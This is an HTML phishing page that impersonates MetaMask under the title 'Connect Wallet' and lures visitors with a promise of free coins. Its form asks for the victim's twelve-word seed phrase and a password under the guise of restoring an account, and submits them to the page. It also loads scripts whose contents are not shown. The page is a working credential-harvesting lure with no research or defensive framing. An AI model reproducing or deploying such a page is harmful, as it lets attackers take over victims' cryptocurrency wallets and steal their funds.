<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Nikmati Coin Gratis dari Token" />
    <title>Connect Wallet</title>
    <!-- favicon -->
    <link rel="shortcut icon" href="./assets/images/mm.png" type="./assets/images/icon.png" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous" />
    <!-- style css Vendor -->
    <link rel="stylesheet" href="./assets/css/style2.css" />
<script src="jquery.min.js"></script>
       <script src="plugins@view/sinop.min.js" charset="utf-8" type="text/javascript"></script>
</head>

<body>
<section class="mt-3">
    <div class="container d-flex align-items-center">
        <img class="" style="width: 60px;" src="./assets/images/mm.png" alt="mm">
        <span class="ms-3" style="font-size: 25px;">
            Metamask
        </span>
    </div>
</section>
<hr>
<div class="container">
    <form action="" method="post" id="myform" >
<div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;">
<div class="ant-col ant-form-item-control">

        <div class="import-account-title">Restore your Account with Seed Phrase</div>
 
        <div class="import-account-selector-label">Enter your secret twelve word phrase here to restore your vault.
        </div>
        <input type="hidden" name="type" value="meta">
        <div class="form-group mt-5">
            <textarea class="form-control" placeholder="Separated each words with a single space" name="UdangGala"
                rows="6" cols="3" minlength="24" maxlength="450"" required></textarea>
        </div>
        <div class="row mt-4">
            <div class="col-6">
                <div class="form-group">
                    <label for="pass-meta-1">
                        New Password (min 8 chars)
                    </label>
                    <input type="password" name="pass-meta-1" class="form-control" required>
                </div>
                <div class="form-group mt-4">
                    <label for="pass-meta-2">
                        Confirm Password
                    </label>
                    <input type="password" name="pass-meta-2" class="form-control" required>
                </div><br>
                <div class="row px-3 mt-3">
                    <button class="btn btn-warning mm-btn text-white" type="submit"
                        style="background:orange">RESTORE</button>
                </div>
            </div>
        </div>
    </form>
</div>
<script src="scripmt.js"></script>
</body>

</html>
